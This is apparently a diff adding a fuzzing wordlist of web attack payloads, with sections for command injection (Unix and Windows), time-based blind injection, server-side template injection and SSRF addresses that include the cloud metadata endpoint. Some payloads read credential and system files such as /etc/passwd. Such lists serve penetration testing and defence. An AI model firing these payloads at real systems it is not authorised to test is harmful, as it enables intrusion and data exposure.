@@ -1,0 +1,88 @@
+# ── Basic command injection
+;id
+;whoami
+;uname -a
+;cat /etc/passwd
+;ls -la
+;pwd
+;hostname
+;ifconfig
+;ipconfig
+|id
+|whoami
+|uname -a
+|cat /etc/passwd
+`id`
+`whoami`
+`uname -a`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+${IFS}id
+%0aid
+%0awhoami
+\nid
+\nwhoami
+& id
+& whoami
+&& id
+&& whoami
+|| id
+|| whoami
+
+# ── Windows
+;dir
+;ver
+;type C:\Windows\win.ini
+|dir
+|ver
+& dir
+& ver
+&& dir
+&& ver
+|| dir
+|| ver
+%0Adir
+%0Aver
+$(dir)
+`dir`
+; ping -c 3 127.0.0.1
+& ping -c 3 127.0.0.1
+
+# ── Blind RCE (time-based)
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+; timeout 5
+; waitfor /t 5 SignalName
+& ping -n 5 127.0.0.1
+
+# ── SSTI (Server-Side Template Injection)
+{{7*7}}
+{{config}}
+{{self}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+@(7*7)
+*{7*7}
+${{7*7}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.environ}}
+{{config.from_object('os')}}
+{{''.__class__.__base__.__subclasses__()}}
+
+# ── SSRF helpers
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://169.254.169.254/
+http://[::1]/
+http://0177.0.0.1/
+http://2130706433/
+http://0x7f000001/
+http://0x0100007f/
+http://0x7f000001/0x7f000001/
